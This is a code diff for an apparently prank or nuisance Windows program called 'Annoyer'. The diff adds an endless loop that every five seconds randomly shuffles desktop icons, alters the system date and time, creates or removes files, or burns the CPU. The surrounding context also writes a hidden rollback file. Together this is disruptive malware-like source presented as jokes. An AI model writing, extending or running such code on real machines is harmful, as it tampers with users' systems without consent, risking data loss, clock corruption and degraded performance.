@@ -21,8 +21,6 @@ int Annoyer::j_cli_with_msg(char* msg) {
 	return 0;
 }
 
-// TODO - Method to un-shuffle and return the original icon positions
-// (based on tools_189702.sys file, which contains an array of)
 
 int Annoyer::j_desktop_shuffle() {
 	TCHAR win_path[MAX_PATH];
@@ -51,7 +49,7 @@ int Annoyer::j_desktop_shuffle() {
 
 	// Create rollback data file in C:\windows if it does not exist
 	//GetWindowsDirectory(win_path, MAX_PATH);
-	desktop_path =  get_desktop_path();
+	desktop_path = get_desktop_path();
 
 	ss.str(L"");
 	ss.clear();
@@ -108,7 +106,7 @@ int Annoyer::j_desktop_shuffle() {
 			CloseHandle(h_process);
 		}
 
-		file.write(reinterpret_cast<const char*>(icon_positions), sizeof(POINT) *nIcons);
+		file.write(reinterpret_cast<const char*>(icon_positions), sizeof(POINT) * nIcons);
 		file.close();
 
 		// Hide the file
@@ -124,6 +122,10 @@ int Annoyer::j_desktop_shuffle() {
 
 	//std::cout << nIcons << std::endl;
 	return 0;
+}
+
+int Annoyer::j_desktop_unshuffle() {
+	return restoreShuffledDesktop();
 }
 
 
@@ -238,3 +240,68 @@ int Annoyer::j_cpu_burn(int seconds) {
 	return 0;
 }
 
+
+void Annoyer::start_annoying() {
+	Jokes joke;
+	joke_data j_data;
+
+	for (;;) {
+		Sleep(5000);
+		joke = this->choose_random_joke();
+
+		switch (joke)
+		{
+		case Jokes::dont:
+			printf("dont\n");
+			break;
+		case Jokes::cli_with_msg:
+			printf("cli_with_msg\n");
+			this->joke(Jokes::cli_with_msg, &j_data);
+			break;
+		case Jokes::desktop_shuffle:
+			printf("desktop_shuffle\n");
+			this->joke(Jokes::desktop_shuffle, &j_data);
+			break;
+		case Jokes::desktop_unshuffle:
+			printf("desktop_unshuffle\n");
+			this->joke(Jokes::desktop_unshuffle, &j_data);
+			break;
+		case Jokes::time_date_mod:
+			printf("time_date_mod\n");
+			tm time_struct;
+			j_data.date_1 = &time_struct;
+			j_data.date_1->tm_year = 2022;
+			j_data.date_1->tm_mon = 11;
+			j_data.date_1->tm_mday = 28;
+			j_data.date_1->tm_hour = 3;
+			j_data.date_1->tm_min = 15;
+			j_data.date_1->tm_sec = 0;
+			j_data.date_1->tm_min = 0;
+			j_data.bool_1 = false;
+			this->joke(Jokes::time_date_mod, &j_data);
+			break;
+		case Jokes::files_creation:
+			printf("files_creation\n");
+			j_data.int_1 = 10;
+			j_data.fn_fmt = Filename_fmt::eastern;
+			this->joke(Jokes::files_creation, &j_data);
+			break;
+		case Jokes::files_removal:
+			printf("files_removal\n");
+			this->joke(Jokes::files_removal, &j_data);
+			break;
+		case Jokes::cpu_burn:
+			printf("cpu_burn\n");
+			j_data.int_1 = 10; // 10 seconds
+			this->joke(Jokes::cpu_burn, &j_data);
+			break;
+		default:
+			break;
+		}
+
+	}
+}
+
+Jokes Annoyer::choose_random_joke() {
+	return static_cast<Jokes>(rand() % 8);
+}
